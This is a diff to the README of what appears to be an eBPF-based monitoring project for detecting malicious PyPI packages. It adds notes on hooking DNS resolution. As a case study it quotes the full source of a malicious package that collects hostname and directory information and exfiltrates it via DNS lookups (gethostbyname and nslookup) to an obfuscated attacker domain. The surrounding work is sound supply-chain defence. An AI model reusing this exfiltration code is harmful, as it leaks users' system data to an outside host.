@@ -188,11 +188,92 @@ int kprobe_do_sys_openat2(struct pt_regs *ctx)
 ### 3.1 问题
 - ebpf监控力度粗于python3 rasp的方式，导致系统级别噪声过多，在后置聚合、关联、检测能力较弱的情况下，较难完成预期的恶意包判责，易陷入误报/漏洞的跷跷板中。
 
+
 ### 留坑
 两个周末完成的工程中留下的小坑也不少，后续如有时间会做fix
 - ebpf中sys_exec只获取pid\comm\filename，缺失后置判责逻辑中的强需的avg信息
 - server中main.py获取新增pypi package中应修改为threading+asyncio方式，且目前仅获取新增package未判断version粒度变化
 - server中的runner.py判责逻辑只做简单黑白名单规则，没有根据多hook信息中pid做关联、聚合等逻辑
+
+## feature
+### dns hook
+通过hook```getaddrinfo```函数可以获取通过curl/wget等方式的dns查询，但是无法获取nslook不通过getaddrinfo函数的数据
+相关恶意包case  
+
+#### google_longrunning为例
+```
+import os
+import socket
+import json
+import binascii
+import random
+import string
+
+
+PACKAGE = 'google_longrunning'
+SUFFIX = '.lol.0d'+'ay-se'+'curity.com';
+NS = 'lol.0da'+'y-sec'+'urity.com';
+
+
+def generate_id():
+    return ''.join(random.choice(
+        string.ascii_lowercase + string.digits) for _ in range(12)
+    )
+
+def get_hosts(data):
+
+    data = binascii.hexlify(data.encode('utf-8'))
+    data = [data[i:i+60] for i in range(0, len(data), 60)]
+    data_id = generate_id()
+
+    to_resolve = []
+    for idx, chunk in enumerate(data):
+        to_resolve.append(
+            'v2_f.{}.{}.{}.v2_e{}'.format(
+                data_id, idx, chunk.decode('ascii'), SUFFIX)
+            )
+
+    return to_resolve
+
+
+def try_call(func, *args):
+    try:
+        return func(*args)
+    except:
+        return 'err'
+
+
+data = {
+    'p' : PACKAGE,
+    'h' : try_call(socket.getfqdn),
+    'd' : try_call(os.path.expanduser, '~'),
+    'c' : try_call(os.getcwd)
+}
+
+data = json.dumps(data)
+
+
+to_resolve = get_hosts(data)
+for host in to_resolve:
+    try:
+        socket.gethostbyname(host)
+    except:
+        pass
+
+to_resolve = get_hosts(data)
+for host in to_resolve:
+    os.system('nslookup {} {}'.format(host, NS))
+```
+- 可支持
+```
+socket.gethostbyname(host)
+```
+- 不支持
+```
+os.system('nslookup {} {}'.format(host, NS))
+```
+
+
 
 ## 参考1-效果
 [部分样本](https://github.com/Kevin-sa/ebpf-supply-chain/tree/master/small_sample)  
